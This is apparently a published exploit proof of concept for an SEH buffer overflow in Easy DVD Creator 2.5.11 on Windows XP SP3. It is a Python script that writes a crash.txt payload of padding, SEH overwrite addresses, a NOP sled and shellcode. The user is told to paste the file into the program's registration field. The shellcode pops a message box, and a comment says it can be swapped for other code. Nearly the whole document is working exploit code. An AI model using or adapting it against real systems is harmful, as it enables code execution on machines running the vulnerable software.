# swami karupasami thunai
###############################################################################
# Exploit Title:        Easy DVD Creator 2.5.11 - Buffer Overflow (Windows XP SP3, SEH)
# Date:                 05-03-2018
# Exploit Author:       Mohan Ravichandran
# Vulnerable Software:  Easy DVD Creator
# Vendor Homepage:      http://www.divxtodvd.net/
# Version:              2.5.11
# Software Link:        https://www.exploit-db.com/apps/86d5e428a8469f5eae802fc32340062b-easy_dvd_creator.exe
# Tested On:            Windows XP Service Pack 3 (Version 2002)
#
# Credit to Muhann4d for discovering the PoC (41911).
#
# To reproduce the exploit:
#   1. Click Register
#   2. In the "Enter User Name" field, paste the content of Crash.txt
#
##############################################################################

file = open("crash.txt","w")
junk = "A" * 996
nseh = "\xeb\x10\x90\x90"
seh = "\xF4\x65\x01\x10" # 100165F4
nops = "\x90" * 20
# The below shellcode will open a message box, can change if needed!
shellcode = "\x31\xc0\x31\xdb\x31\xc9\x31\xd2"
shellcode +="\x51\x68\x6c\x6c\x20\x20\x68\x33"
shellcode +="\x32\x2e\x64\x68\x75\x73\x65\x72"
shellcode +="\x89\xe1\xbb\x7b\x1d\x80\x7c\x51" #// 0x7c801d7b ; LoadLibraryA(user32.dll)
shellcode +="\xff\xd3\xb9\x5e\x67\x30\xef\x81"
shellcode +="\xc1\x11\x11\x11\x11\x51\x68\x61"
shellcode +="\x67\x65\x42\x68\x4d\x65\x73\x73"
shellcode +="\x89\xe1\x51\x50\xbb\x40\xae\x80" #// 0x7c80ae40 ; GetProcAddress(user32.dll, MessageBoxA)
shellcode +="\x7c\xff\xd3\x89\xe1\x31\xd2\x52"
shellcode +="\x51\x51\x52\xff\xd0\x31\xc0\x50"
shellcode +="\xb8\x12\xcb\x81\x7c\xff\xd0"
file.write(junk+nseh+seh+nops+shellcode+nops)
file.close()
